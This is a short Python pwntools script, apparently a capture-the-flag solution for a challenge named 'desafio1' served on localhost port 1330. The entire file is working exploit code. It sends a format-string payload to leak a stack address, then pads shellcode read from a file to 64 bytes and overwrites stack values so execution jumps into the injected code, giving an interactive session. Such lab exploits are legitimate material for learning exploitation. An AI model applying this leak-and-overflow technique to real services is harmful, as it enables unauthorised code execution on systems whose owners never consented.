#!/bin/python3
from pwn import *
import os

os.chdir('./desafio1/')
#p = process(['./desafio'])
p = remote('localhost', 1330)

payload = b'banana%16$llxbanana'

p.sendline(payload)
p.readuntil(b'banana')

stack_leak = int(p.readuntil(b'banana', True), 16)
log.info(f'stack leak: {hex(stack_leak)}')

with open('../payload', 'rb') as file:
    payload = file.read()

payload += b'a'*(64 - len(payload))
payload += p64(stack_leak)
payload += p64(stack_leak - 0x60)

p.sendlineafter(b'mensagem?', payload)
p.stream()
